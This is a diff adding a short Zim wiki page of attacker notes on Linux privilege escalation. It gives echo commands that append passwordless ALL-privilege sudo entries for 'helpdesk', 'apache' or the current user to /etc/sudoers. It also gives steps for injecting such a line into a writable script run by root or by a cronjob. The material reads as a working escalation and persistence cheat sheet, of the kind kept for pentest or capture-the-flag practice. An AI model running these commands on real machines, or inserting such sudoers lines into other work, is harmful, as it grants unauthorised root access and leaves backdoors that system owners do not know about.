@@ -1,0 +1,15 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+
+====== ADD TO SUDOERS ======
+username  ALL=(ALL) NOPASSWD:ALL
+
+echo "helpdesk ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+echo "apache ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+==== Editing a file that runs with root to give you root access ====
+Editing sudoers with a vulnerable file:
+	- echo “#!/bin/sh” > [path to file with root privileges you can edit] (After multiple times editing this file I found that without this initial line I’ll run into an error).
+	- echo “sudo echo “[logged in user] ALL=NOPASSWD ALL” >> /etc/sudoers” >> [path to file with root privileges you can edit] (This appends [user] to the sudoers file with the ability to sudo everything once the script runs.
+	- Execute action to get file to run (Whether that’s wait till a cronjob runs or you need to execute something you have sudo permissions to and get the script to run).
